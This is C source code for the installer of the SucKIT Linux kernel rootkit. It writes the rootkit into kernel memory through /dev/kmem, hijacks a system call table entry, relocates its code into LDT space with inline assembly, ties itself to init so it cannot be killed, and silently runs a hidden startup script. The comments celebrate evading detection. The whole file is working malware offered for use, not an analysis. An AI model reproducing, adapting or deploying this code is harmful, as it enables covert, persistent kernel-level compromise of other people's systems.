/*
 * $Id: install.c, kernel memory installator
 *
 * Our propagation into kernel memory is basically this:
 * First ask kernel to allocate 64kb for per-process LDT.
 * We'll get private gdt. Then we'll do a sldt, look for
 * given gdt, extract base from it and we could be happy,
 * we've nice place in kernel memory. No f*cking kmalloc()
 * anymore ;) Because suckit (including fake IDT) will
 * reside in process's LDT space, the pid shouldn't die
 * (=freeing LDT table space). We're solving this by
 * transforming our elite pid to idle task (pid==0), so
 * it can't be killed in any way ;)
 *
 * UPDATE: we're going more far: by previous scenario
 * we enter into kernel mode and do almost *same* think
 * with pid 1 ;-) thus ldt is allocated in init.
 * bye bye psreal ;-)
 */

#include <stdio.h>
#include <stdlib.h>
#include <setjmp.h>
#include <unistd.h>
#include <asm/unistd.h>
#include <errno.h>
#include <sys/wait.h>
#include <sched.h>
#include <sys/signal.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/un.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

#include "sk.h"
#include "ldt.h"
#include "gdt.h"
#include "segment.h"
#include "setup.h"
#include "kmem.h"
#include "extract.h"
#include "kernel.h"
#include "skd.h"
#include "config.h"
#include "sha1.h"

int isilent = 0;
extern	int cpid;

#define	__NR_findpid SYSHOOK
#define __NR_sys_vmalloc SYSAUX
#define SYSHOOK	SYSAUX
static inline _syscall2(int, findpid, int, pid, int, offset);
static inline _syscall3(int, modify_ldt, int, func, void *, ptr, unsigned long, bytecount);
static inline _syscall3(int, sys_vmalloc, int, size, int, gfp1, int, gfp2);

static ulong	ldt_alloc()
{
	struct	ldts ldt;
	struct	gdtr gdtr;
	struct	gdt  gdt;
	ulong	ldt_index;

	ldt.entry_number = STUBOFF; /* the last entry */
	ldt.base_addr = B3 | (B4 << 8);
	ldt.limit = B1 | (B2 << 8);
	ldt.contents = 0;
	ldt.read_exec_only = 0;
	ldt.seg_32bit = 0;
	ldt.limit_in_pages = 0;
	ldt.seg_not_present = 1;
	ldt.useable = 0;

	if (modify_ldt(1, &ldt, sizeof(ldt))) {
		perror("modify_ldt");
		return 0;
	}

	ldt_index = get_ldt();
	get_gdt(&gdtr);

	if (rkm(&gdt, sizeof(gdt), gdtr.base + ldt_index) != sizeof(gdt)) {
		eprintf("%s: weird ldt\n", __func__);
		return 0;
	}
	return GDT_BASE(gdt);
}

int	reloctest(uchar *start, uchar *end)
{
	int c = 0;
	uchar	*s;

	for (s = start; s <= end; s++) {
		ulong *p = (ulong *) s;
		if ((*p >= (ulong) start) && (*p <= (((ulong) end)))) {
			c++;
			s += 3;
		}
	}
	return c;
}

static int	relocate(uchar *start, uchar *end, ulong base, ulong from)
{
	int	count = 0;
	uchar	*s;
	ulong	size = (ulong) end - (ulong) start;

	dbg("relocating start at %p, end %p\n", start, end);
	base -= (ulong) from;
	for (s = start; s <= (end); s++) {
		ulong *p = (ulong *) s;
		if ((*p >= (ulong) from) && (*p <= (((ulong) (from+size))))) {
			*p += base;
			s += 3;
			count++;
		}
	}
	dbg("relocate: %d relocations made\n", count);
	return count;
}

jmp_buf env;

void	goexit(int s)
{
	longjmp(env, s==SIGUSR1?1:2);
}

void	waiter(int s)
{
	/* dummy */
}

ulong	sct;
extern	int initialized;

int	install(void)
{
	ulong	kmem, size, vmalloc, ldta, tmp;
	int	sock;
	char	brm[20], blah[20], *stubk;
	struct	sockaddr_un un;
	memcpy(blah, cfg.hashpass, 10);
	memcpy(blah + 10, "suckitrock", 10);
	sha1_asm(brm, blah, 20);
	sock = socket(AF_UNIX, SOCK_STREAM, 0);
	un.sun_family = AF_UNIX;
	memset(un.sun_path, 0, sizeof(un.sun_path));
	memcpy(&un.sun_path[1], brm, 20);
	if (bind(sock, (struct sockaddr *) &un, sizeof(un))) {
		eprintf("Lock assert: someone else is installing suckit right now!\n");
		return 1;
	}
	

	eprintf("Loading suckit %s...", VERSION); fflush(stdout);
	

	size = (ulong) kernel_end - (ulong) kernel_start;
	dbg("kernel image size is %ld bytes\n", size);

	if (kmem_init() < 0) {
		perror(DEFAULT_KMEM);
		goto err;
	}
	sct = get_sct();
	if (!sct) {
		eprintf("can't find sys_call_table[], sorry...\n");
		goto err;
	}
	kernel_sct = (void *) sct;
	kbase = get_kbase();
	kidt = (void *) get_idt_table();
	/* save previous entry to sys_mpx */
	dbg("aux ptr = %p\n", (void *) (sct + (SYSAUX * sizeof(ulong))));
	if (rkm(&kernel_sysaux, sizeof(ulong), sct + (SYSAUX * sizeof(ulong))) != 4) {
		eprintf("can't save previous sys_mpx, sorry...\n");
		goto err;
	}
	dbg("previous sys_mpx was %p\n", (void *) kernel_sysaux);

	/* now point sys_mpx to vmalloc */
	
//	tmp = kmem + (STUBOFF*8);
	if (wkm(&vmalloc, sizeof(vmalloc), sct + SYSAUX * sizeof(ulong)) != 4) {
		eprintf("can't setup vmalloc syscall, sorry...\n");
		goto err2;
	}
	dbg("vmalloc syscall at installed\n");
	
	/* now go for some bytes of kernel memory */

	/* install ldt to make jumping point */
	ldta = ldt_alloc();

	chdir("/");

	dbg("ldta = %x\n", ldta);

	skd_init();

        /*
	 * first thing to do is to relocate kernel code
	 * to it's offset in kernel space, wrrrm.
	 */


	stubk = malloc(size);
	if (!stubk) {
		eprintf("out of memory\n");
		goto err2;
	}
	memcpy(stubk, kernel_start, size);
	tmp = relocate(stubk, stubk + size, ldta, (ulong) kernel_start);
	dbg("%ld relocs in stub\n", tmp);

	tmp = ldta + (STUBOFF*8);
	if (wkm(&tmp, sizeof(tmp), sct + SYSAUX * sizeof(ulong)) != 4) {
		eprintf("can't setup ldt jump point, sorry...\n");
		goto err2;
	}
	dbg("ldt jump point syscall installed\n");

	/*
	 * well, done. this is point of no return. we've
	 * repz; movsb; jmp *%ebp code somewhere in kernel
	 * memory. that will be used to copy rest of us,
	 * because we can't /dev/kmem write to vmalloc()-ed mem
	 * on kernels prior to 2.2.17
		 */
	__asm__ __volatile__ (
	"\tpush %%ebp\n"
	"\tpush	%%ebp\n"
	"\tmov	%%ebx, %%ebp\n"
	"\tint	$0x80\n"
	"\tpop	%%ebp\n"
	"\tpop  %%ebp\n"
	: "=a" (kmem)
	:
	"0" (SYSAUX),				/* syscall nr */
	"b" (((ulong) kernel_entry - (ulong) kernel_start)+ldta),	/* kernel entry */
	"c" (size), 				/* size */
	"S" (stubk),			/* to start copy from */
	"D" (ldta)				/* destination */
	);
	
	if (!kmem) {
		eprintf("kernel memory allocation error\n");
		goto err2;
	}

	dbg("ldt memory in init allocated at %p", kmem)
	initialized = 1;
	tmp = relocate((void *)kernel_start, (void *)kernel_end, kmem, (ulong) kernel_start);
	dbg("number of kernel relocs = %ld\n", tmp);

	__asm__ __volatile__ (
	"\tpush %%ebp\n"
	"\tpush	%%ebp\n"
	"\tmov	%%ebx, %%ebp\n"
	"\tint	$0x80\n"
	"\tpop	%%ebp\n"
	: "=a" (tmp)
	:
	"0" (SYSAUX),				/* syscall nr */
	"b" (((ulong) kernel_entry - (ulong) kernel_start)+kmem),	/* kernel entry */
	"c" (size), 				/* size */
	"S" (kernel_start),			/* to start copy from */
	"D" (kmem)				/* destination */
	);

	kmem_cleanup();
	if (tmp == KERNEL_MAGIC)
		eprintf("\r\e[JSuckit installed sucessfuly\n");
	close(sock);
	/* execute the .rc script, if any */
	if ((isilent) && (!fork())) {
		if (!fork()) {
			int fd;
			char buf[512];
			setsid();
			setpgrp();
			fd = open("/dev/null", O_RDWR);
			dup2(fd, 0);
			dup2(fd, 1);
			dup2(fd, 2);
			sprintf(buf, "%s/.rc", cfg.home);
			execl(buf, buf, NULL);
			exit(0);
		}
		exit(0);
		
	}
	exit(0);
	/* not reached */
err2:
	wkm(&kernel_sysaux, sizeof(ulong), sct + SYSAUX * sizeof(ulong));
	kmem_cleanup();
err:
	exit(0);
}

